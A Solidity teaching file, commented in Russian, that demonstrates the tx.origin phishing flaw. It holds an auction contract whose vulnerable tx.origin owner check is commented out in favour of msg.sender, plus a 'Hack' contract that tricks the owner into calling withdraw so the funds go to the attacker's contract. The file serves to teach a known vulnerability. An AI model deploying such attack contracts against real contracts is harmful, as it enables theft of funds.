// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

/**
 * @title AuctionTxOrigin
 * @author HiH_DimaN
 * @notice Контракт аукциона, уязвимый к атаке, использующей `tx.origin`.
 */
contract AuctionTxOrigin {
    /**
     * @dev Адрес владельца контракта.
     */
    address owner; // Адрес владельца контракта

    /**
     * @dev Модификатор, который проверяет, что вызывающий является владельцем.
     */
    modifier onlyOwner() {
        // require(tx.origin == owner, "not an owner!"); // это уязвимость для взлома
        require(msg.sender == owner, "not an owner!"); // Проверяем, что вызывающий является владельцем
        _; // Выполняем следующую инструкцию, если вызывающий является владельцем
    }

    /**
     * @dev Конструктор контракта.
     */
    constructor() payable {
        owner = msg.sender; // Устанавливаем владельца контракта в адрес вызывающего
    }

    /**
     * @dev Функция для вывода средств на указанный адрес.
     * @param _to Адрес получателя средств.
     */
    function withdraw(address _to) external onlyOwner{
        (bool ok,) = _to.call{value: address(this).balance}(""); // Отправляем средства на указанный адрес
        require(ok, "can`t send"); // Проверяем успешность отправки
    }

    /**
     * @dev Функция для получения эфира контрактом.
     */
    receive() external payable{}
}

/**
 * @title Hack
 * @author HiH_DimaN
 * @notice Контракт, который атакует контракт AuctionTxOrigin, используя уязвимость `tx.origin`.
 */
contract Hack {
    /**
     * @dev Ссылка на атакуемый контракт.
     */
    AuctionTxOrigin toHack; // Ссылка на атакуемый контракт

    /**
     * @dev Конструктор контракта, который атакует аукцион.
     * @param _toHack Адрес атакуемого контракта.
     */
    constructor(address payable _toHack) payable {
        toHack = AuctionTxOrigin(_toHack); // Устанавливаем ссылку на атакуемый контракт
    }

    /**
     * @dev Функция для выполнения атаки, которая выводит средства из атакуемого контракта.
     */
    function getYourMoney() external {
        (bool ok,) = msg.sender.call{value: address(this).balance}(""); // Отправляем средства отправителю
        require(ok, "can`t send"); // Проверяем успешность отправки

        toHack.withdraw(address(this)); // Вызываем функцию withdraw в атакуемом контракте, используя адрес Hack
    }

    /**
     * @dev Функция для получения эфира контрактом.
     */
    receive() external payable{}
}